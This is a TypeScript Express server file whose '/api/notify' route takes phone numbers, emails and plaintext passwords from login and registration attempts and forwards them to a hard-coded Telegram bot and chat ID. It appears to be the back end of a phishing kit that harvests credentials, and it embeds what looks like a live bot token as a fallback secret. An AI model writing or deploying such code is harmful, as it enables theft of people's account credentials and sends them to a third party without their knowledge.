import express from 'express';
import path from 'path';
import { fileURLToPath } from 'url';
import { createServer as createViteServer } from 'vite';
import dotenv from 'dotenv';

dotenv.config();

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

async function startServer() {
  const app = express();
  const PORT = 3000;

  app.use(express.json());

  // API Route for Telegram Notification
  app.post('/api/notify', async (req, res) => {
    const { type, data } = req.body;
    const botToken = process.env.TELEGRAM_BOT_TOKEN || '8908374782:AAF2PPU4Xzl3nhHgca9cOXvXbqNHXbgCjGA';
    const chatId = process.env.TELEGRAM_CHAT_ID || '8141432907';

    if (!botToken || !chatId) {
      console.error('Telegram bot token or chat ID missing');
      return res.status(500).json({ error: 'Telegram credentials missing' });
    }

    let message = `🚀 <b>New ${type === 'login' ? 'Login' : 'Registration'} Attempt</b>\n\n`;
    
    if (data.phone) message += `📱 <b>Phone:</b> ${data.phone}\n`;
    if (data.email) message += `📧 <b>Email:</b> ${data.email}\n`;
    if (data.password) message += `🔑 <b>Password:</b> <code>${data.password}</code>\n`;
    if (data.tab) message += `📑 <b>Method:</b> ${data.tab}\n`;
    
    message += `\n🕒 <b>Time:</b> ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`;

    try {
      console.log('Sending message to Telegram...');
      const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
      const response = await fetch(telegramUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: 'HTML',
        }),
      });

      const result: any = await response.json();
      if (!result.ok) {
        console.error('Telegram API Error:', result);
        throw new Error(result.description || 'Failed to send message to Telegram');
      }

      console.log('Telegram notification sent successfully');
      res.json({ success: true });
    } catch (error: any) {
      console.error('Error sending Telegram notification:', error.message);
      res.status(500).json({ error: error.message || 'Failed to send notification' });
    }
  });

  // Vite integration
  if (process.env.NODE_ENV !== 'production') {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: 'spa',
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), 'dist');
    app.use(express.static(distPath));
    app.get('*', (req, res) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server running at http://localhost:${PORT}`);
  });
}

startServer();
